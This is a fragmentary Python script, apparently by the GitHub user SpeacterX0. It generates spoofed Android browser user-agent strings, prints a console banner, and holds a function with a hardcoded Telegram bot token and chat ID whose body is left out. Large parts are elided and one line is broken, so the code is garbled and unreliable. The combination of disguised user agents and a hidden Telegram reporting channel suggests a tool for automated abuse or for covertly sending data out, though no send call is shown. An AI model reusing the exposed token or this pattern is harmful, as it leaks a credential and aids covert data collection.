...
# github —» https://github.com/SpeacterX0
...
b = random.choice([f" {i}.0" for i in range(5, 13)])
c = random.choice(["SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C"])
d = random.choice([chr(i) for i in range(ord("A"), ord("Z")+1)])
e = random.randint(1, 999)
f = random.choice([chr(i) for i in range(ord("A"), ord("Z")+1)])
...
user_agent_os = 'Mozilla/5.0 (Linux; Android'
user_agent_version = random.choice(['7.0', '8.1.0', '9', '10', '11', '12'])
user_agent_device = random.choice(['Oppo A4 Build/MMB29M; wv)'])
user_agent_suffix = f"{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{random.randint(1, 999)}{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}"

user_agent_browser = 'AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
user_agent_browser_version = f"{random.randint(80, 103)}.{random.randint(0, 9)}.{random.randint(4200, 4900)}.{random.randint(40, 150)}"

user_agent_mobile = 'Mobile Safari/537.36'
user_agent = f"{user_agent_os} {user_agent_version}; {user_agent_device}{user_agent_suffix}) {user_agent_browser}{user_agent_browser_version} {user_agent_mobile}"
...
ugen = []
for _ in range(10):
    ugen.append(generate_user_agent())
...
ugen = [generate_user_agent() for _ in range(5)]
print(ugen)
...
ugen = [generate_user_agent() for _ in range(3)]
print(ugen)
...
ugen = [generate_user_agent() for _ in range(1)]
print(ugen)
...
def banner():
    Console().print(
        Panel(
            """
                                                    [bold yelow]NAMA :[bold green]SPEACTERX0                   
[bold red]       ╔╦╗╔═╗╔╗╔╔═╗╔═╗╔═╗╔╦╗╔═╗╔╦╗╔═╗  
[bold red]       ║║║╚═╗║║║╚═╗║╣ ║╣ ║ ╚═╗ ║ ╚═╗                 [bold green]          
...
# -----------------[*a*as*a *e*a*a]-------------------#
def mainduluyuk2():
	BOT_TOKEN = "8167993537:AAFzXSmMtIjVq8Qu-iVgBvHQpIPDPkiDOVQ"  # 
	CHAT_ID = "5712523062"      # G
	# 
	try:
...
# -----------------------[ SYSTEM-CONTROL ]--------------------#def mainduluyuk():
    # kode di sini
...
if __name__ == "__main__":
    ...
    for dir in dirs:
        try:
            ...
            print(f"Direktori {dir} sudah ada.")
        except Exception as e:
            print(f"Error: {e}")
